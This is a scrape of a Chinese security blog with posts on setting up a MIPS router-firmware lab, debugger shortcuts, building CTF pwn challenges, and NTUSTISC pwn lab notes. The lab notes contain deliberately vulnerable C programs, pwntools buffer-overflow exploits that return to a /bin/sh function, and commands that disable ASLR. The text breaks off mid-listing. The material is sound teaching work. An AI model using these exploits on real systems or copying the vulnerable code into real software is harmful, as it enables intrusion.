        <content type="html"><![CDATA[<p>参考<a href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">路由器漏洞分析环境搭建</a></p><p><a href="https://bbs.pediy.com/thread-258071.htm">路由器环境基础工具安装</a></p><p>基础环境：</p><p>Ubuntu 18.04 x86</p><h2 id="0x00-修改pip源"><a href="#0x00-修改pip源" class="headerlink" title="0x00 修改pip源"></a>0x00 修改pip源</h2><p>ubuntu 18.04下修改pip镜像源</p><p>在home/用户名/目录下创建.pip文件夹</p><p>然后cd .pip</p><p>创建pip.conf文件touch pip.conf</p><p>输入以下内容然后保存即可</p><pre><code>[global]timeout = 6000index-url = http://mirrors.aliyun.com/pypi/simple/trusted-host = mirrors.aliyun.com</code></pre><p>上面是更换为阿里源，其他源也是一样，比如中科大就替换相应内容如下</p><pre><code>index-url=http://pypi.mirrors.ustc.edu.cn/simple/trusted-host =pypi.mirrors.ustc.edu.cn</code></pre><h2 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h2><pre><code>pip install --upgrade pipgit clone https://github.com/devttys0/binwalk.gitcd binwalksudo python setup.py installsudo ./deps.sh</code></pre><p>安装好后，直接使用 binwalk -Me 命令即可提取固件内容。</p><h2 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h2><p>sudo apt-get install libncurses5-dev patch</p><p>去<a href="https://buildroot.org/downloads/">buildroot.org</a>下载buildroot-2019.02.4.tar.gz</p><pre><code>tar -zxvf buildroot-2019.02.4.tar.gzmake cleanmake menuconfig</code></pre><p>之后会出现一个配置的界面，在target options-&gt;target arch选项里面选择自己要编译的架构，这里选择MIPS(Little endian)，代表MIPS小端序。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/e9GdGq.png"></p><p>在toolchain–&gt;Kernel Headers选择自己主机的内核版本或者更低的版本，我这里是4.19的，保存退出。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/e9G0zV.png"></p><p>sudo make</p><p>然后静等可能数小时…..编译完成之后，写个例子测试一下</p><p>编写例子hello.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int vul(char *src)&#123;    char output[20] = &#123;0&#125;;    strcpy(output,src);    printf(&quot;%s\n&quot;,output);    return 0;&#125;int main(int argc, char *argv[])&#123;    if(argc &lt; 2)    &#123;        printf(&quot;need more arguements\n&quot;);        return 1;    &#125;    vul(argv[1]);    return 0;&#125;</code></pre><p>mamba@ubuntu:~/buildroot-2019.02.4/output/host/usr/bin$ ./mipsel-linux-gcc ~/hello.c -o ~/hello</p><p>这时候./hello运行不了，使用file命令看到是小端序的MIPS程序，交叉编译的环境已经搭建完了。接下来我们搭建运行环境。</p><h2 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h2><pre><code>sudo apt-get install qemusudo apt-get install qemu-user-static</code></pre><p>运行测试程序hello</p><pre><code>qemu-mipsel ~/hello</code></pre><p>mipsel这里代表小端序的mips，但是这里可能会报错</p><pre><code>/lib/ld-uClibc.so.0: No such file or directory</code></pre><p>这是因为没有对应架构的链接库的问题</p><pre><code>cd cd buildroot-2019.02.4/output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/sudo cp ld-uClibc-1.0.31.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.31.sosudo ln -s /lib/ld-uClibc-1.0.31.so /lib/ld-uClibc.so.0</code></pre><p>运行还是报错</p><pre><code>/home/mamba/hello: can&#39;t load library &#39;libc.so.0&#39;</code></pre><p>解决问题</p><pre><code>sudo cp libuClibc-1.0.31.so /lib/sudo chown -R root:root /lib/libuClibc-1.0.31.sosudo ln -s /lib/libuClibc-1.0.31.so /lib/libc.so.0</code></pre><p>运行成功</p><pre><code>mamba@ubuntu:~$ qemu-mipsel ~/hello hellohello</code></pre><h2 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h2><p>我们还需要配置qemu的网络环境，这样有利于之后我们的调试</p><pre><code>sudo apt-get install bridge-utils uml-utilities</code></pre><p>为了与 QEMU 虚拟机通信，添加一个虚拟网卡</p><pre><code>sudo tunctl -t tap0 -u `whoami`</code></pre><p>为添加的虚拟网卡配置 IP 地址</p><pre><code>sudo ifconfig tap0 10.10.10.1/24</code></pre><p>重启一下网络</p><pre><code>sudo /etc/init.d/networking restart</code></pre><p>可以看到现在的网卡</p><pre><code>mamba@ubuntu:~$ ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.24.163  netmask 255.255.255.0  broadcast 192.168.24.255        ether 00:0c:29:c2:0a:28  txqueuelen 1000  (Ethernet)        RX packets 99869  bytes 102158342 (102.1 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 29637  bytes 2923220 (2.9 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 18677  bytes 1693297 (1.6 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 18677  bytes 1693297 (1.6 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0tap0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.10.10.1  netmask 255.255.255.0  broadcast 10.10.10.255        inet6 fe80::8c17:a4ff:fef3:a807  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 8e:17:a4:f3:a8:07  txqueuelen 1000  (Ethernet)        RX packets 26  bytes 2010 (2.0 KB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 59  bytes 13596 (13.5 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>从 <a href="https://people.debian.org/~aurel32/qemu/mips/">Debian 官网</a>下载两个文件，这里给出的链接是MIPS大端的，需要mipsel小端和其他架构的可以去上层目录找，搭建这个环境也是同理。</p><pre><code>vmlinux-2.6.32-5-4kc-maltadebian_squeeze_mips_standard.qcow2</code></pre><p>把以上两个文件放在同一个目录执行以下命令</p><pre><code>sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=ttyS0&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no</code></pre><p>虚拟机启动成功后会提示登陆，用户名和密码都为 root</p><p>配置网卡IP</p><pre><code>ifconfig eth0 10.10.10.2/24</code></pre><p>此时 QEMU 虚拟机可以与宿主机进行网络通信</p><pre><code>root@debian-mips:~# ping 10.10.10.1PING 10.10.10.1 (10.10.10.1) 56(84) bytes of data.64 bytes from 10.10.10.1: icmp_req=1 ttl=64 time=7.06 ms64 bytes from 10.10.10.1: icmp_req=2 ttl=64 time=2.16 ms64 bytes from 10.10.10.1: icmp_req=3 ttl=64 time=0.245 ms^C--- 10.10.10.1 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2004msrtt min/avg/max/mdev = 0.245/3.159/7.064/2.870 ms</code></pre><p>可以通过 Python 搭建简易 HTTP Server 传输数据</p><p>在宿主机某目录执行命令</p><pre><code>python -m SimpleHTTPServer</code></pre><p>在 QEMU 虚拟机中就可以下载该目录文件</p><pre><code>wget http://10.10.10.1:8000/xxx</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全成长</title>
      <link href="2020/09/13/2020-09-14-to_be_number_1/"/>
      <url>2020/09/13/2020-09-14-to_be_number_1/</url>
      
        <content type="html"><![CDATA[<p>耐心 仔细 努力</p><ol><li>自己搭建乌云漏洞库</li></ol><p>推荐GitHub上的一个虚拟机项目：<a href="https://link.zhihu.com/?target=https://github.com/hanc00l/wooyun_public">wooyun公开漏洞纪念版</a></p><p>漏洞库一定要刷，这个是最直接的让自己了解安全全貌的方式。也是成长最快的路径！</p><ol start="2"><li>准备一些常规的渗透工具，并且知道常规的一些用法</li></ol><p>kali（集成了sqlmap，nmap，python运行环境）</p><p>burpsuite</p><p>layer的域名爆破 或者 lijiejie在GitHub上的项目 subdomain.py</p><p>指纹识别的网站<a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></p><p>Googlehacking语法</p><p><a href="https://www.exploit-db.com/">exploit-db</a></p><p><a href="http://cve.mitre.org/">cve.mitre</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA/x64dbg/GDB常用快捷键指令</title>
      <link href="2020/09/02/2020-09-02-GDB_common_instructions/"/>
      <url>2020/09/02/2020-09-02-GDB_common_instructions/</url>
      
        <content type="html"><![CDATA[<p>IDA</p><table><thead><tr><th>快速键</th><th>说明</th></tr></thead><tbody><tr><td>左键点两下</td><td>跳过去 object / function 所在位址</td></tr><tr><td><code>g</code></td><td>跳到指定位址</td></tr><tr><td><code>x</code></td><td>寻找参考点（那里使用到现在指标指向的object）</td></tr><tr><td><code>esc</code></td><td>返回上一个地方</td></tr><tr><td><code>F5</code></td><td>反编译</td></tr><tr><td><code>n</code></td><td>重新命名</td></tr></tbody></table><p>x64dbg</p><table><thead><tr><th>快速键</th><th>说明</th></tr></thead><tbody><tr><td><code>Ctrl-G</code></td><td>跳到指定位址，可以输入 API Name 或是记忆体位址</td></tr><tr><td><code>Ctrl-F2</code></td><td>重新执行正在被 debug 的程序</td></tr><tr><td><code>F2</code></td><td>在现在选取的拿一行 assembly 下断点</td></tr><tr><td><code>F7</code></td><td>步入 call</td></tr><tr><td><code>F8</code></td><td>步进（执行完 call 指令，不跟进去）</td></tr><tr><td><code>F9</code></td><td>直接执行</td></tr><tr><td><code>Ctrl-F9</code></td><td>执行到 <code>ret</code> 停下来</td></tr></tbody></table><p>GDB</p><p>PEDA  <a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p><table><thead><tr><th>指令</th><th>说明</th><th>范例</th></tr></thead><tbody><tr><td>disas addr</td><td>对地址addr处的指令进行反汇编，addr可以是函数名字</td><td>disas main</td></tr><tr><td>b func</td><td>在 func 下断点</td><td>b main</td></tr><tr><td>b *0xADD</td><td>在 ADDR 下断点</td><td>b *0x08048000</td></tr><tr><td>enable</td><td>激活断点</td><td></td></tr><tr><td>disable</td><td>禁用断点</td><td></td></tr><tr><td>info b</td><td>查看断点</td><td>i b</td></tr><tr><td>del $NUM</td><td>删除第 $NUM 个断点</td><td>d 1</td></tr><tr><td>c</td><td>继续执行</td><td></td></tr><tr><td>r</td><td>开始执行 / 重新执行</td><td></td></tr><tr><td>r args</td><td>开始执行（给被debug的程序参数）</td><td></td></tr><tr><td>si</td><td>step into（跟进去 call）</td><td></td></tr><tr><td>ni</td><td>next instruction（不跟进去 call）</td><td></td></tr><tr><td>x</td><td>印出 pointer 指向的资料（<code>help x</code>看详细用法）</td><td>x/16xw $esp</td></tr><tr><td>p</td><td>直接印出资料</td><td>p/d 0x5566</td></tr><tr><td>i b</td><td>列出所有 breakpoints (info braekpoints)</td><td></td></tr><tr><td>i file</td><td>列出档案资讯</td><td></td></tr><tr><td>q</td><td>关闭 gdb</td><td></td></tr><tr><td>set *(char)0xadd = 5</td><td>写入记忆体，语法类似 C</td><td></td></tr><tr><td>set $rax = 0x87</td><td>改变 register 的值（也可以改 EIP / RIP）</td><td></td></tr><tr><td>fini</td><td>执行到 ret （离开现在的 function）</td><td>finish</td></tr><tr><td>bt</td><td>backtrace，印出 function call 的记录</td><td>backtrace</td></tr><tr><td>set args</td><td>可指定运行时参数</td><td>set args 10 20 30 40 50</td></tr><tr><td>show args</td><td>可以查看设置好的运行参数</td><td></td></tr><tr><td>stack 100</td><td>插件提供的，显示栈中100项</td><td></td></tr><tr><td>find xxx</td><td>快速查找，很实用</td><td></td></tr><tr><td>file app</td><td>载入指定的程序.如果刚开始运行gdb而不是用gdb app启动的话可以这样载入app程序</td><td></td></tr><tr><td>vmmap</td><td>查看映射状况</td><td>vm</td></tr></tbody></table><p>x 命令 查看内存</p><pre><code>格式: x /nfu &lt;addr&gt;说明：    x 是 examine 的缩写    n表示要显示的内存单元的个数    f表示显示方式, 可取如下值        x 按十六进制格式显示变量。        d 按十进制格式显示变量。        u 按十进制格式显示无符号整型。        o 按八进制格式显示变量。        t 按二进制格式显示变量。        a 按十六进制格式显示变量。        i 指令地址格式        c 按字符格式显示变量。        f 按浮点数格式显示变量。    u表示一个地址单元的长度        b表示单字节        h表示双字节        w表示四字节        g表示八字节常用组合：    x/wx $esp 　　以4字节16进制显示栈中内容    x/wx 地址　　查看DWORD    x/c 地址　　单字节查看    x/16x $esp+12 查看寄存器偏移    x/x $esp 查看esp寄存器中的值    x/s addr 查看addr处的字符串    x/b addr 查看addr处的字符    x/i addr 查看addr处的反汇编结果</code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn题搭建</title>
      <link href="2020/09/02/2020-09-02-pwn_env/"/>
      <url>2020/09/02/2020-09-02-pwn_env/</url>
      
        <content type="html"><![CDATA[<p>第一步 准备一道pwn题的源码</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    int a=1;    float key=2018.81,input;    if (a==2)    &#123;        printf(&quot;input your key:\n&quot;);        scanf(&quot;%f&quot;,&amp;input);        if(input==key)            printf(&quot;mctf&#123;Hahahahaha_Y0u_C@n_use_GDB_N0W&#125;&quot;);    &#125;    return 0;&#125;</code></pre><p>第二步 gcc编译，因为还要牵扯到很多的开关，所以这里一步步来</p><ol><li><p>关闭DEP/NX（堆栈不可执行）</p><p> gcc  -z execstack -o 编译完的文件名 待编译的文件名</p></li><li><p>关掉Stack Protector/Canary（栈保护）</p><p> gcc -fno-stack-protector -o 编译完的文件名 待编译的文件名</p></li><li><p>关掉程序ASLR/PIE（程序随机化保护）</p><p> gcc -no-pie 编译完的文件名 待编译的文件名</p></li><li><p>关闭整个linux系统的ASLR保护</p><p> sudo -s<br> echo 0 &gt; /proc/sys/kernel/randomize_va_space<br> exit</p></li><li><p>打开整个linux系统的ASLR保护</p><p> sudo -s<br> echo 2 &gt; /proc/sys/kernel/randomize_va_space</p></li><li><p>64位linux下面的GCC编译出一个32位可执行程序</p><p> gcc -m32 -z execstack -fno-stack-protector -o 编译完的文件名 待编译的文件名</p></li></ol><p>第三步 我们在做题目的时候经常碰到的就是将题目作为一个服务绑定在一个服务器的一个端口上，所以接下来可以用socat</p><pre><code>socat tcp-l:端口号，fork exec:程序位置，reuseaddr</code></pre><p>第四步 访问题目</p><pre><code>nc IP地址 端口号</code></pre><p>注：会遇到需要清空输入输出流问题以及批量部署问题 </p><p>参考<a href="https://blog.csdn.net/qq_38204481/article/details/83017024">ctf pwn出题和搭建环境</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652848854&idx=1&sn=ff537cc73e76e1ab058bd36cb76749a0&chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&mpshare=1&scene=1&srcid=1011dGXhepYahcla33btEWte#rd">如何安全快速地部署多道 ctf pwn 比赛题目 </a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn NTUSTISC</title>
      <link href="2020/09/02/2020-09-02-pwn_NTUSTISC/"/>
      <url>2020/09/02/2020-09-02-pwn_NTUSTISC/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1SJ411s7MW?from=search&seid=7437726646310679386">B站视频资料</a></p><p><a href="https://isc.taiwan-te.ch/scoreboard/">NTUSTISC平台官网 Proving Grounds</a></p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>本例子在Lab0目录下，是用来熟悉pwntools使用</p><p>pwntools常用命令</p><pre><code>from pwn import *   # 也可以直接   import pwnsock = remote(&#39;127.0.0.1&#39;, 9001)     # 连接远程服务sock.recvline()           #  接收一行sock.recvuntil(&#39;hello&#39;)  # 直到接收到某字符串sock.send(&#39;foo&#39;)                 #  发送消息sock.interactive()               #  进入交互模式</code></pre><h3 id="实验Lab0-pwntools"><a href="#实验Lab0-pwntools" class="headerlink" title="实验Lab0:pwntools"></a>实验Lab0:pwntools</h3><p>例子包含c文件、可执行文件以及exp脚本</p><p>pwntools.c文件，在90秒内，正确输入magic number，并且答对1000道计算题，获取系统权限。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;void handler(int signum)&#123;puts(&quot;Timeout&quot;);_exit(1);&#125;int main()&#123;setvbuf(stdout, 0, 2, 0);setvbuf(stdin, 0, 2, 0);signal(SIGALRM, handler);alarm(90);unsigned seed = (unsigned)time(NULL);srand(seed);unsigned int magic;printf(&quot;Give me the magic number :)\n&quot;);read(0, &amp;magic, 4);if (magic != 3735928559) &#123;    printf(&quot;Bye~\n&quot;);    exit(0);&#125;printf(&quot;Complete 1000 math questions in 90 seconds!!!\n&quot;);for (int i = 0; i &lt; 1000; ++i) &#123;    int a = random() % 65535;    int b = random() % 65535;    int c = random() % 3;    int ans;    switch(c) &#123;    case 0:        printf(&quot;%d + %d = ?&quot;, a, b);        scanf(&quot;%d&quot;, &amp;ans);        if (ans != a + b) &#123;        printf(&quot;Bye Bye~\n&quot;);        exit(0);        &#125;        break;    case 1:        printf(&quot;%d - %d = ?&quot;, a, b);        scanf(&quot;%d&quot;, &amp;ans);        if (ans != a - b) &#123;        printf(&quot;Bye Bye~\n&quot;);        exit(0);        &#125;        break;    case 2:        printf(&quot;%d * %d = ?&quot;, a, b);        scanf(&quot;%d&quot;, &amp;ans);        if (ans != a * b) &#123;        printf(&quot;Bye Bye~\n&quot;);        exit(0);        &#125;        break;    &#125;&#125;printf(&quot;Good job!\n&quot;);system(&quot;sh&quot;);return 0;&#125;</code></pre><p>pwntool文件，在本地搭建到端口9999</p><pre><code>socat tcp-l:9999,fork exec:./pwntools</code></pre><p>exp脚本</p><pre><code>from pwn import *# r = remote(&#39;isc.taiwan-te.ch&#39;,9999)r = remote(&#39;127.0.0.1&#39;,9999)r.recvuntil(&#39;Give me the magic number :)\n&#39;)p = p32(0xdeadbeef)r.send(p)r.recvline()for i in range(1000):    q = r.recvuntil(&#39; = ?&#39;).replace(&#39; = ?&#39;,&#39;&#39;)    # print q,i    ans = eval(q)    r.sendline(str(ans))r.interactive()</code></pre><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="了解-elf-binary-format-文件装载映射"><a href="#了解-elf-binary-format-文件装载映射" class="headerlink" title="了解 elf binary format 文件装载映射"></a>了解 elf binary format 文件装载映射</h4><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/binaryFormat.png"></p><h4 id="了解-x64-calling-convention"><a href="#了解-x64-calling-convention" class="headerlink" title="了解 x64 calling convention"></a>了解 x64 calling convention</h4><pre><code>rdi rsi rdx rcx r8 r9 (push to stack)rdi rsi rdx r10 r8 r9 (push to stack) for system callreturn value is stored in raxExample:foo(0x100,0x200,0x300,0x400,0x500,0x600,0x700,0x800);push 0x800push 0x700mov r9d,0x600mov r8d,0x500mov ecx,0x400mov edx,0x300mov esi,0x200mov edi,0x100call foo</code></pre><h4 id="了解-Stack-Frame"><a href="#了解-Stack-Frame" class="headerlink" title="了解 Stack Frame"></a>了解 Stack Frame</h4><p>Function Prologue</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/ntustisc_pwn-05-32-24.png"></p><p>Function Epilogue</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/ntustisc_pwn-05-41-41.png"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/ntustisc_pwn-05-41-10.png"></p><h4 id="了解-Buffer-Overflow"><a href="#了解-Buffer-Overflow" class="headerlink" title="了解 Buffer Overflow"></a>了解 Buffer Overflow</h4><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/ntustisc_pwn-06-02-14.png"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/ntustisc_pwn-06-03-07.png"><br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/ntustisc_pwn-06-03-51.png"></p><h4 id="了解-Return-to-Text"><a href="#了解-Return-to-Text" class="headerlink" title="了解 Return to Text"></a>了解 Return to Text</h4><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>利用text段上面的有价值的可利用的code,如</p><pre><code>void secret_func() //0x400607&#123;    //show passwords    ...&#125;</code></pre><h4 id="了解各个段"><a href="#了解各个段" class="headerlink" title="了解各个段"></a>了解各个段</h4><p>bss段、data段、text段、堆（heap）、栈(stack)的一些区别。</p><p>1、bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，bss段属于静态内存分配。</p><p>2、data段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域，数据段属于静态内存分配。</p><p>3、text段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p><p>4、堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p><p>5、栈(stack)：栈又称堆栈，是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。</p><h4 id="了解-ROP"><a href="#了解-ROP" class="headerlink" title="了解 ROP"></a>了解 ROP</h4><p>ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><ul><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p></li></ul><h3 id="实验Lab-1-bof"><a href="#实验Lab-1-bof" class="headerlink" title="实验Lab 1:bof"></a>实验Lab 1:bof</h3><p>例子包含c文件、可执行文件以及exp脚本</p><p>bof.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void y0u_c4n7_533_m3()&#123;execve(&quot;/bin/sh&quot;, (char *[])&#123;0&#125;, (char *[])&#123;0&#125;);&#125;int main()&#123;char buf[16];puts(&quot;This is your first bof challenge ;)&quot;);fflush(stdout);read(0, buf, 0x30);return 0;&#125;</code></pre><p>漏洞利用就在read(0, buf, 0x30)处，buf是16字节，但可以读取48字节，此时可以覆盖main返回地址；</p><p>利用objdump查看y0u_c4n7_533_m3函数地址，利用该函数获取shell</p><pre><code>objdump -d -M intel bof</code></pre><p>可以看到地址是0x400607</p><pre><code>0000000000400607 &lt;y0u_c4n7_533_m3&gt;:400607:    55                       push   rbp400608:    48 89 e5                 mov    rbp,rsp40060b:    48 83 ec 10              sub    rsp,0x1040060f:    48 c7 45 f0 00 00 00     mov    QWORD PTR [rbp-0x10],0x0400616:    00 400617:    48 c7 45 f8 00 00 00     mov    QWORD PTR [rbp-0x8],0x040061e:    00 40061f:    48 8d 55 f0              lea    rdx,[rbp-0x10]400623:    48 8d 45 f8              lea    rax,[rbp-0x8]400627:    48 89 c6                 mov    rsi,rax40062a:    48 8d 3d d7 00 00 00     lea    rdi,[rip+0xd7]        # 400708 &lt;_IO_stdin_used+0x8&gt;400631:    e8 ca fe ff ff           call   400500 &lt;execve@plt&gt;400636:    90                       nop400637:    c9                       leave  400638:    c3                       ret  </code></pre><p>exp</p><pre><code>from pwn import *r = process(&#39;./bof&#39;)p = &#39;a&#39;*0x18 + p64(0x400607)r.recvuntil(&#39;This is your first bof challenge ;)&#39;)r.send(p)r.interactive()</code></pre><p>调试技巧</p><pre><code>在脚本r = process(&#39;./bof&#39;)后添加raw_input()，运行脚本程序就会卡住,并且返回了一个pid值[+] Starting local process &#39;./bof&#39;: pid 123509gdb ./bofattach程序at 123509反汇编disas main 设置断点在read函数b *0x000000000040066d继续c脚本处回车，发送数据ni可以看到之前的stack和现在的比较[------------------------------------stack-------------------------------------]0000| 0x7ffe56f6e9d8 --&gt; 0x400672 (&lt;main+57&gt;:    mov    eax,0x0)0008| 0x7ffe56f6e9e0 --&gt; 0x7ffe56f6eae0 --&gt; 0x1 0016| 0x7ffe56f6e9e8 --&gt; 0x0 0024| 0x7ffe56f6e9f0 --&gt; 0x400680 (&lt;__libc_csu_init&gt;:    push   r15)0032| 0x7ffe56f6e9f8 --&gt; 0x7fc5be5a8cca (&lt;__libc_start_main+234&gt;:    mov    edi,eax)0040| 0x7ffe56f6ea00 --&gt; 0x7ffe56f6eae8 --&gt; 0x7ffe56f7040e --&gt; 0x524f00666f622f2e (&#39;./bof&#39;)0048| 0x7ffe56f6ea08 --&gt; 0x100000000 0056| 0x7ffe56f6ea10 --&gt; 0x400639 (&lt;main&gt;:    push   rbp)[------------------------------------stack-------------------------------------]0000| 0x7ffe56f6e9d8 --&gt; 0x400672 (&lt;main+57&gt;:    mov    eax,0x0)0008| 0x7ffe56f6e9e0 (&#39;a&#39; &lt;repeats 24 times&gt;, &quot;\a\006@&quot;)0016| 0x7ffe56f6e9e8 (&#39;a&#39; &lt;repeats 16 times&gt;, &quot;\a\006@&quot;)0024| 0x7ffe56f6e9f0 (&quot;aaaaaaaa\a\006@&quot;)0032| 0x7ffe56f6e9f8 --&gt; 0x400607 (&lt;y0u_c4n7_533_m3&gt;:    push   rbp)0040| 0x7ffe56f6ea00 --&gt; 0x7ffe56f6eae8 --&gt; 0x7ffe56f7040e --&gt; 0x524f00666f622f2e (&#39;./bof&#39;)0048| 0x7ffe56f6ea08 --&gt; 0x100000000 0056| 0x7ffe56f6ea10 --&gt; 0x400639 (&lt;main&gt;:    push   rbp)返回地址已经变为 0x400607 也就是 函数y0u_c4n7_533_m3</code></pre><h2 id="bof2"><a href="#bof2" class="headerlink" title="bof2"></a>bof2</h2><h3 id="实验Lab-2-bof2"><a href="#实验Lab-2-bof2" class="headerlink" title="实验Lab 2:bof2"></a>实验Lab 2:bof2</h3><p>例子包含c文件、可执行文件以及exp脚本</p><p>bof2.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void y0u_c4n7_533_m3()&#123;int allow = 0;if (allow) &#123;    execve(&quot;/bin/sh&quot;, 0, 0);&#125;else &#123;    puts(&quot;Oh no~~~!&quot;);    exit(0);&#125;&#125;int main()&#123;char buf[16];puts(&quot;This is your second bof challenge ;)&quot;);fflush(stdout);read(0, buf, 0x30);if (strlen(buf) &gt;= 16) &#123;    puts(&quot;Bye bye~~&quot;);    exit(0);&#125;return 0;&#125;</code></pre><p>这里需要考虑绕过strlen函数和allow两个点</p><pre><code>strlen用\x00绕过allow可以直接到IDA或者objdump找execve地址</code></pre><p>objdump 查看函数y0u_c4n7_533_m3</p><pre><code>objdump -d -M intel bof20000000000400697 &lt;y0u_c4n7_533_m3&gt;:400697:    55                       push   rbp400698:    48 89 e5                 mov    rbp,rsp40069b:    48 83 ec 10              sub    rsp,0x1040069f:    c7 45 fc 00 00 00 00     mov    DWORD PTR [rbp-0x4],0x04006a6:    83 7d fc 00              cmp    DWORD PTR [rbp-0x4],0x04006aa:    74 18                    je     4006c4 &lt;y0u_c4n7_533_m3+0x2d&gt;4006ac:    ba 00 00 00 00           mov    edx,0x04006b1:    be 00 00 00 00           mov    esi,0x04006b6:    48 8d 3d 1b 01 00 00     lea    rdi,[rip+0x11b]        # 4007d8 &lt;_IO_stdin_used+0x8&gt;4006bd:    e8 be fe ff ff           call   400580 &lt;execve@plt&gt;4006c2:    eb 16                    jmp    4006da &lt;y0u_c4n7_533_m3+0x43&gt;4006c4:    48 8d 3d 15 01 00 00     lea    rdi,[rip+0x115]        # 4007e0 &lt;_IO_stdin_used+0x10&gt;4006cb:    e8 80 